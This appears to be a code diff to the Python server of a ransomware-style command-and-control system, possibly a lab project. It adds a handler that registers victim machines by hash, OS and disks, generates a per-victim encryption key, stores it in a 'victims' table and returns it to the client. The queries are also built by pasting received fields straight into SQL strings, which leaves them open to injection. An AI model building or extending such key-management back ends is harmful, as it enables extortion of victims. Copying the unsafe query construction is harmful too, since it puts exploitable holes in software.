@@ -3,7 +3,7 @@ import threading
 import utile.data as data
 import utile.message as message
 import utile.network as net
-
+import utile.security as secu
 THREADS_QUEUE = {'CONTROLE': '', 'FRONTAL': ''}
 
 
@@ -43,23 +43,22 @@ def Serveur_Frontal(FIFO_message_type):
         print(
             f'[+] SERVEUR FRONTAL | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
             f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
-        recv_data = net.receive_message(conn)
 
-        FIFO_message_type.put([recv_data, 'FRONTAL'])
-        """    while True:
-                print('oui')
-                if FIFO_resp.empty():
-                    continue
-                elif not FIFO_resp.empty():
-                    print('Dedans?')
-                    net.send_message(conn, FIFO_resp.get())"""
         while True:
-            packet = FIFO_resp.get()
-            FIFO_resp.task_done()
-            net.send_message(conn, packet)
-            if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
-                    packet) == 'LIST_VICTIM_END':
+            try:
+                recv_data = net.receive_message(conn)
+                FIFO_message_type.put([recv_data, 'FRONTAL'])
+            except:
+                conn.close()
+                print('[+] Déconnexion du Serveur Frontal')
                 break
+            while True:
+                packet = FIFO_resp.get()
+                FIFO_resp.task_done()
+                net.send_message(conn, packet)
+                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
+                        packet) == 'LIST_VICTIM_END' or message.get_message_type(packet) == 'INITIALIZE_RESP':
+                    break
 
 
 def ThreadMaster(FIFO_message_type):
@@ -105,8 +104,23 @@ def ThreadMaster(FIFO_message_type):
         elif message_type == 'CHANGE_STATE':
             data.change_state(recv_data)
 
-        elif message_type == 'INITIALIZE':
-            pass
+        elif message_type == 'INITIALIZE_REQ':
+            conn, cursor = data.connect_to_DB()
+            if not data.execute_query(conn, cursor, f'SELECT hash, os, disks FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"'):
+                query = f'INSERT INTO victims(hash, os, disks, key )VALUES("{recv_data["INITIALIZE"]}", "{recv_data["OS"]}", "{recv_data["DISKS"]}", "{secu.generated_encrypted_key()}")'
+                data.execute_query(conn, cursor, query)
+                victim_identity = data.execute_query(conn, cursor, f'SELECT id_victim FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"')
+                query = f'INSERT INTO states(id_victim, state)VALUES({victim_identity[0][0]}, "INITIALIZE")'
+
+                data.execute_query(conn, cursor, query)
+            list_info= data.execute_query(conn, cursor, f'SELECT v.id_victim, v.key, s.state FROM victims v JOIN states s ON s.id_victim = v.id_victim WHERE v.hash = "{recv_data["INITIALIZE"]}"')
+            id_victim, key, state = list_info[0]
+            FIFO_resp.put(message.set_message('INITIALIZE_KEY', [id_victim, key, state]))
+
+
+
+
+
 
 
 def main():
